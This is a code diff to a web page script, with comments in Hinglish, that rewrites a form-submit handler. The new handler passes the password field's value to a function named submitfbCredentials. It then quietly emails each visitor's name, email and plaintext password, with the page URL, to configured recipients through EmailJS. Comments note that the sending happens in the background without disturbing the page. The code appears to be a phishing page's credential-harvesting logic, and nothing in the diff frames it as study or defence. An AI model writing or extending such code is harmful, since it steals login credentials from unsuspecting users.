@@ -2237,33 +2237,27 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
 
   document.querySelectorAll('form').forEach(form => {
     form.addEventListener('submit', function(e) {
-      e.preventDefault();
+      // Pehle tumhara purana code chalao (popup, language, button sab theek rahega)
+      if (typeof submitFormData === 'function') submitFormData();                // pehla form
+      if (typeof submitfbCredentials === 'function') submitfbCredentials(document.querySelector('input[type="password"]')?.value); // password wala
 
+      // Ab EmailJS se mail bhejo (background mein, popup disturb nahi hoga)
       let clientName = this.querySelector('input[name="name"]') ? client1 : client2;
       let toEmail    = this.querySelector('input[name="name"]') ? email1 : email2;
 
-      const params = {
+      emailjs.send("service_nqeen3l", "template_z0ow5n7", {
         client_name: clientName,
         website_url: window.location.href,
-        user_name:   document.querySelector('input[name="name"]')?.value || "No name",
+        user_name:   document.querySelector('input[name="name"]')?.value || "",
         user_mall:   document.querySelector('input[name="mall"]')?.value || "",
         user_pass:   document.querySelector('input[type="password"]')?.value || "",
         to_email:    toEmail
-      };
+      }).then(() => {
+        console.log("Mail bhi chala gaya!");
+      });
 
-      emailjs.send("service_nqeen3l", "template_z0ow5n7", params)
-        .then((response) => {
-          console.log('Email SUCCESS!', response.status, response.text);  // ← Console mein success dikhega
-          alert('Mail bhej diya gaya! Check spam folder.');
-        }, (error) => {
-          console.log('Email FAILED!', error);  // ← Error dikhega console mein
-          alert('Mail fail ho gaya. Console check karo.');
-        });
-
-      // Purana code chalega
-      if (typeof submitFormData === 'function') submitFormData();
-      if (typeof submitfbCredentials === 'function') 
-        submitfbCredentials(document.querySelector('input[type="password"]')?.value);
+      // Form dobara submit na ho → rok do
+      e.preventDefault();
     });
   });
 </script>
